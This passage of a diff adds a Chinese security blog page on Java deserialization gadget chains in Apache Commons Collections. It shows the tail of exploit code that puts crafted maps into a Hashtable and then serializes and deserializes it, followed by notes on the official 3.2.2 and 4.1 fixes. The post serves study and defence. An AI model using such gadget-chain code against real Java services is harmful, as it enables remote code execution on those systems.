class="string">&quot;2&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    hashtable.put(map1,<span class="number">1</span>);</span><br><span class="line">    hashtable.put(map2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    serialize(hashtable);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="commons-collections反序列化官⽅修复⽅法"><a href="#commons-collections反序列化官⽅修复⽅法" class="headerlink" title="commons-collections反序列化官⽅修复⽅法"></a><strong>commons-collections反序列化官⽅修复⽅法</strong></h1><p>问题：PriorityQueue的利⽤链是否⽀持在commons-collections 3中使⽤？</p>
+<p>答案是不能的应为commons-collections 3中的TransformingComparator类没有实现 Serializable 接⼝的。</p>
+<p>问题：commons-collections反序列化的修复。</p>
+<p>Apache Commons Collections官⽅在2015年底得知序列化相关的问题后，就在两个分⽀上同时发布了新的版本，4.1和3.2.2。</p>
+<p>3.2.2新版代码中增加了⼀个⽅法FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全局配置org.apache.commons.collections.enableUnsafeSerialization&#x3D;true，即默认情况下会 抛出异常。</p>
+<p>4.1⾥，这⼏个危险Transformer类不再实现 Serializable 接⼝，也就是说，他们⼏个彻底⽆法序列化和反序列化了</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+	</div>
+
+	
+	<span id="/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E5%88%A9%E7%94%A8%E9%93%BE%E7%AF%87%E5%9B%9B/" class="leancloud-visitors view" data-flag-title="java反序列化CommonsCollections利用链篇四">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/03/20/java反序列化shiro漏洞/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"T4cIyHys5R6e08AOwUNWgymj-gzGzoHsz","appKey":"J1TTypyuxpKKmz37Rd7oQ9tE","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-03-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/JavaWeb/">JavaWeb<span>9</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Java安全/">Java安全<span>9</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#CC3%E7%AD%89%E8%80%81%E9%93%BE%E5%A4%8D%E7%94%A8"><span class="toc-article-text">CC3等老链复用</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#CC2"><span class="toc-article-text">CC2</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PriorityQueue%E5%88%A9%E2%BD%A4%E9%93%BE"><span class="toc-article-text">PriorityQueue利⽤链</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#CC4"><span class="toc-article-text">CC4</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#CC5"><span class="toc-article-text">CC5</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#CC7"><span class="toc-article-text">CC7</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#commons-collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%98%E2%BD%85%E4%BF%AE%E5%A4%8D%E2%BD%85%E6%B3%95"><span class="toc-article-text">commons-collections反序列化官⽅修复⽅法</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 Tptfb11's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
